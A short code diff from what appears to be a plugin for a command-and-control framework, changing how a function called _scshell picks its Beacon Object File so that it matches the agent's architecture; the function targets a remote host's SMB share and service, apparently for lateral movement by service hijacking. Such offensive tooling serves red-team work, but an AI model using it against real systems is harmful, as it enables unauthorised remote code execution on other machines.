@@ -15,7 +15,7 @@ def _scshell(agentId, cmdline, args):
     path = f"\\\\{target}\\{share}\\{name if name else ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=8))}"
     if not path.endswith(".exe"): path += ".exe"
 
-    bof = os.path.join(SCRIPT_DIR, "scshell/scshell.x64.o")
+    bof = os.path.join(SCRIPT_DIR, f"scshell/scshell.{conquest.arch(agentId)}.o")
     params = conquest.bof_pack("zzzb", [
         target,         # z: Target system
         service,        # z: Target service
